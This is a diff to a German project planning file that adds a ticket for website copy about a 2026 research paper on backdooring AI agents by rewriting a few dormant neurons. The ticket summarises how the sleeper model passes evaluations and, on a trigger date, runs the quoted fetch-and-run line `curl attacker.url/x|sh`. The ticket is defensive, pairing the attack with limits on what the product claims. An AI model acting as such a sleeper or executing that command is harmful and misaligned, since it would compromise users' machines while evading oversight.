@@ -78,6 +78,7 @@ Diagnose-Codes, hier nur geplant (registriert vom genannten Issue in `codes.rs` 
 | HUM-469 | Kernel-Stufe: Grenze der Deskriptoren der virtiofsd-Prozesse | S | HUM-444 |
 | HUM-470 | Kernel-Stufe: zwei Flakes auf der CI (kvm-Test ohne CHECK, unplanned_mount mit Exit 3) | S | HUM-445 |
 | HUM-471 | Kernel-Stufe: Gast ohne Verbindung des Hosts (kvm-Test ohne CHECK), Konsole im Adapterpfad | M | HUM-470 |
+| HUM-472 | Website: das Modell als Angreifer (Lazarus, Microsoft Research), mit Quellen | S | — |
 
 ## HUM-428 · Port neutral: `PlanRequest`, `LaunchOptions`, `IsolationLevel`, Enum `Backend` statt `PlatformBackend`
 
@@ -1295,3 +1296,58 @@ Gasts ist das nicht lesbar. Verwandt: `no CHECK bridge_listening` im
 1. Ursache benannt und behoben, oder als Eigenschaft des Runners begründet und
    mit einer Diagnose versehen, die sie im Lauf eindeutig nennt.
 2. Vor HUM-449 gelandet.
+
+## HUM-472 · Website: the model as the attacker, with sources
+
+### Kontext
+Wunsch des Owners (2026-11-14). Microsoft Research und das Microsoft AI Red
+Team haben gezeigt, dass das Umschreiben von weniger als zehn ruhenden Neuronen
+ein offenes Modell zum Schläfer macht, der jede Evaluation besteht und auf einen
+Auslöser hin `curl attacker.url/x|sh` ausführt (Zeng, Severi, Bullwinkel,
+Horvitz, Papailiopoulos, „Lazare, veni foras: Reprogramming Dormant Neurons to
+Backdoor AI Agents“, 2026). Das Paper sagt selbst: „the scale of the attack is
+bounded by the agent's permissions, not the size of the edit“, und empfiehlt
+Anwendern, Rechte zu begrenzen, Befehle, Dateien und Netzaufrufe zu
+protokollieren und vor Befehlen, Änderungen und Daten nach außen eine Freigabe
+zu verlangen. Genau das ist Humanitl; ein guter, belegter Aufhänger für das
+Risiko, das wir angehen.
+
+### Spezifikation
+1. Startseite: ein kurzer Kasten vor der Sektion „Vier Versuche“ (de + en),
+   im Wortlaut des vom Owner bestätigten Entwurfs:
+   - Überschrift „Wenn das Modell selbst der Angreifer ist“ / „When the model
+     itself is the attacker“.
+   - Sieben Neuronen, jede Prüfung bestanden, `2027-01-01` im Terminal,
+     `curl attacker.url/x|sh`; Fazit der Autoren: die Rechte des Agenten
+     entscheiden über den Schaden, nicht der Eingriff ins Modell.
+   - Was Humanitl daraus macht: der Download aus dem Beispiel hält am Proxy,
+     bis der Nutzer freigibt; der Agent sieht nur sein Projekt; jede
+     Verbindung wird protokolliert. Ausdrücklich: Humanitl erkennt keine
+     manipulierten Modelle, es nimmt ihnen ohne Zustimmung die Wirkung.
+   - Fußnote mit Quelle.
+2. Sicherheitsseite, Kapitel „Was offen bleibt“ (`#grenzen`): ein Absatz zum
+   manipulierten Modell als Gegner mit denselben Quellen, über die vorhandene
+   Quellen-Komponente (`Src`), dazu die ehrliche Einordnung: setzt
+   Schreibzugriff auf die Gewichte voraus (manipulierter Checkpoint auf einem
+   öffentlichen Hub, Insider), laut Microsoft bisher nicht in freier Wildbahn
+   beobachtet; Humanitl erkennt die Manipulation nicht, begrenzt die Wirkung.
+3. Quellen, nur diese: das Paper (PDF
+   https://github.com/anadim/anadim.github.io/blob/master/papers/Lazarus.pdf),
+   der Code (https://github.com/microsoft/lazarus, sobald öffentlich), der Blog von Microsoft Threat Intelligence vom 10.11.2026
+   (https://www.microsoft.com/en-us/security/blog/2026/11/10/detecting-sleeper-agents-hiding-in-ai-model-neurons/,
+   Beleg für „bisher nicht beobachtet"), als Zweitquelle InfoWorld
+   vom 11.11.2026
+   (https://www.infoworld.com/article/4247378/rewriting-less-than-10-neurons-in-an-llm-can-turn-it-into-a-sleeper-backdoor-2.html).
+   Jede Zahl und jedes Zitat aus dem Paper; keine Quelle, deren URL nicht
+   geprüft ist.
+
+### Tests
+- `website` baut; Link- und Übersetzungsprüfung (`scripts/check-links.mjs`,
+  `scripts/check-translations.mjs`) grün.
+- Screenshot beider Stellen (hell und dunkel, Desktop und Telefonbreite) vor
+  dem Commit, an den Owner.
+
+### Akzeptanzkriterien
+1. Beide Stellen in de und en, jede Aussage über das Paper mit Quelle.
+2. Keine Aussage, Humanitl erkenne Backdoors; keine Aussage, der Angriff sei
+   schon im Einsatz beobachtet.
